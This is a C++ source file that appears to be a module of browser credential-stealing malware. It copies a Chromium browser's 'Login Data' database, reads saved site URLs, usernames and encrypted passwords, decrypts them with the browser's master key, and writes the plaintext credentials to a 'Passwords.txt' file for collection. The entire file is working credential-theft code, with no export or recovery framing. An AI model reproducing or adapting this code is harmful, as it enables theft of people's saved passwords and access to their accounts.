//
// Created by .1qxz on 08.06.2024.
//

#include "CPasswords.h"

void CPasswords::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Login Data";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<Login> history = this->getPasswords(copied_db);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(Login &row : history)
    {
        if(row.password.empty() && row.username.empty())
            continue;

        row.write(ss);
    }

    Utils::writeFile(root / "Passwords.txt", ss.str(), true);
}

std::list<Login> CPasswords::getPasswords(const fs::path &db_path) {
    std::list<Login> passwords;

    SQLiteUtil::connectAndRead("SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used DESC", db_path, [this, &passwords](sqlite3_stmt *stmt) {
        Login password_record;
        password_record.origin = SQLiteUtil::readString(stmt, 0);
        password_record.username = SQLiteUtil::readString(stmt, 1);

        std::vector<BYTE> password_encrypted = SQLiteUtil::readBytes(stmt, 2);

        std::vector<BYTE> master_key = this->getMasterKey();
        std::string decoded_password = ChromiumUtil::decryptData(password_encrypted, master_key);
        password_record.password = decoded_password;

        passwords.push_back(password_record);
    });

    return passwords;
}
